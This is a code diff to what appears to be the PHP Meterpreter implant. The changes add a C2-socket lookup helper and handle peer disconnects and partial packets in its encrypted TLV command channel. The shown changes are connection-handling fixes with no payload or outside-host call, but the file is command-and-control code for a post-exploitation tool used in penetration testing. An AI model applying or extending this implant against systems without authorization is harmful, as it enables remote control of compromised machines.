@@ -1099,9 +1099,18 @@ function write_tlv_to_socket($resource, $raw) {
   write($resource, $xor . xor_bytes($xor, encrypt_packet($raw)));
 }
 
-function handle_dead_resource_channel($resource) {
-  global $msgsock;
+# Returns the active transport's C2 socket, or null for HTTP transports
+# (which don't use a persistent socket).
+function get_c2_socket() {
+  $idx = $GLOBALS['current_transport_idx'];
+  if (!isset($GLOBALS['transport_list'][$idx])) {
+    return null;
+  }
+  $t = $GLOBALS['transport_list'][$idx];
+  return isset($t['_socket']) ? $t['_socket'] : null;
+}
 
+function handle_dead_resource_channel($resource) {
   if (!is_resource($resource) && !is_object($resource)) {
     return;
   }
@@ -1120,16 +1129,24 @@ function handle_dead_resource_channel($resource) {
     # Make sure we close other handles associated with this channel as well
     channel_close_handles($cid);
 
-    # Notify the client that this channel is dead
-    $pkt = pack("N", PACKET_TYPE_REQUEST);
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMMAND_ID, COMMAND_ID_CORE_CHANNEL_CLOSE));
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
+    # Notify the client that this channel is dead. This function is only
+    # ever called from dispatch_tcp, so HTTP transports never reach here.
+    # On HTTP, the framework discovers a dead channel implicitly: the next
+    # core_channel_read poll returns ERROR_FAILURE (channel_read returns
+    # false on EOF), and the framework infers closure from that error.
+    # The null guard below is a safety net in case that changes.
+    $c2_sock = get_c2_socket();
+    if ($c2_sock !== null) {
+      $pkt = pack("N", PACKET_TYPE_REQUEST);
+      packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMMAND_ID, COMMAND_ID_CORE_CHANNEL_CLOSE));
+      packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
+      packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
+      packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
 
-    # Add the length to the beginning of the packet
-    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
-    write_tlv_to_socket($msgsock, $pkt);
+      # Add the length to the beginning of the packet
+      $pkt = pack("N", strlen($pkt) + 4) . $pkt;
+      write_tlv_to_socket($c2_sock, $pkt);
+    }
   }
 }
 
@@ -1593,7 +1610,14 @@ function dispatch_tcp(&$transport) {
         $len_array = unpack("Nlen", substr($header, 20, 4));
         $len = $len_array['len'] + 32 - 8;
         while (strlen($packet) < $len) {
-          $packet .= read($msgsock, $len - strlen($packet));
+          $chunk = read($msgsock, $len - strlen($packet));
+          if ($chunk === false || $chunk === '') {
+            # The C2 socket closed mid-packet; the partial packet is
+            # unprocessable so retire rather than attempt a corrupt response.
+            remove_reader($msgsock); close($msgsock);
+            return DISPATCH_RETIRE;
+          }
+          $packet .= $chunk;
         }
         $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
         write_tlv_to_socket($msgsock, $response);
@@ -1924,11 +1948,15 @@ function read($resource, $len=null) {
       socket_recvfrom($resource, $buff, $len, PHP_BINARY_READ, $host, $port);
     } else {
       my_print("Reading TCP socket");
-      $buff .= socket_read($resource, $len, PHP_BINARY_READ);
+      $result = socket_read($resource, $len, PHP_BINARY_READ);
+      # socket_read returns "" or false when the peer closes the connection.
+      if ($result === false || $result === '') {
+        return false;
+      }
+      $buff = $result;
     }
     break;
   case 'stream':
-    global $msgsock;
     # Calling select here should ensure that we never try to read from a socket
     # or pipe that doesn't currently have data.  If that ever happens, the
     # whole php process will block waiting for data that may never come.
@@ -1972,13 +2000,25 @@ function read($resource, $len=null) {
       } else {
         $tmp = fread($resource, $len);
         $last_requested_len = $len;
+        # An empty fread on a stream that stream_select reported as readable
+        # means the peer has closed the connection (EOF). feof() may not return
+        # true immediately on all stream types (e.g. SSL), so treat "" as EOF.
+        if ($tmp === false || $tmp === '') {
+          # If we've already buffered some data, return what we have rather
+          # than signalling EOF; the caller will see EOF on the next read.
+          if (strlen($buff) > 0) {
+            break;
+          }
+          return false;
+        }
         $buff .= $tmp;
         if (strlen($tmp) < $len) {
           break;
         }
       }
 
-      if ($resource != $msgsock) { my_print("buff: '$buff'"); }
+      $c2_sock = get_c2_socket();
+      if ($resource !== $c2_sock) { my_print("buff: '$buff'"); }
       $r = Array($resource);
     }
     my_print(sprintf("Done with the big read loop on %s, got %d bytes, asked for %d bytes", get_resource_map_id($resource), strlen($buff), $last_requested_len));
